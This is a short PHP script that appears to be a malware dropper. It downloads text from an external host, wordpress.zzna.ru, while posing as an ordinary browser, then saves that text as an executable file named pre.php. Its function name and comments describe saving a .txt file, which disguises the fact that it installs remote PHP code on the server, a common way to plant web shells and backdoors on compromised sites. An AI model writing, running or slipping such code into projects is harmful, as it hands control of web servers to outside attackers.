<?php

function download_file_to_txt_alternative($url, $save_path) {
    // Set up the context for the request, with HTTP headers to mimic a regular browser
    $options = array(
        'http' => array(
            'header' => "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36\r\n"
        )
    );
    $context = stream_context_create($options);

    // Fetch the file content
    $file_content = @file_get_contents($url, false, $context);

    // Check if the file content was retrieved successfully
    if ($file_content === false) {
        echo 'Failed to download the file or access was denied.';
        return false;
    }

    // Save the content to a .txt file
    if (file_put_contents($save_path, $file_content) !== false) {
        echo 'File downloaded and saved successfully.';
        return true;
    } else {
        echo 'Failed to save the file.';
        return false;
    }
}

$url = 'https://wordpress.zzna.ru/newb/new.txt';
$save_path = 'pre.php';
download_file_to_txt_alternative($url, $save_path);
